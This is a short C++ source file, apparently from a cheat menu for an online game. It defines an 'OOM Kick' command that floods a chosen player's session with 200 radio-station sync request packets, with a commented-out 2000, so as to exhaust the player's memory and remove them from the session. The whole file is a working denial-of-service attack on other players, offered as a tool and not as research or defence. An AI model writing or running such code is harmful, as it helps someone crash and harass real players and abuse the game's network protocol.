#include "backend/player_command.hpp"
#include "packet.hpp"
#include "services/notifications/notification_service.hpp"

#include <network/snSession.hpp>

namespace big
{
	class oom_kick : player_command
	{
		using player_command::player_command;

		virtual void execute(player_ptr player) override
		{
			if (!player)
				return;

			g_notification_service->push_success("Kick", std::format("OOM kick to {}", player->get_name()), true);

			packet msg{};

			msg.write_message(rage::eNetMessage::MsgRadioStationSyncRequest);
			auto msg_id = player->get_session_player()->m_msg_id;

			// for (int j = 0; j < 2000; j++)
			for (int j = 0; j < 200; j++)
				msg.send(msg_id);
		}
	};

	oom_kick g_oom_kick("oomkick", "OOM Kick", "sends 200 msgs. Kick with alert. Chance of backfiring in its curr. state");
}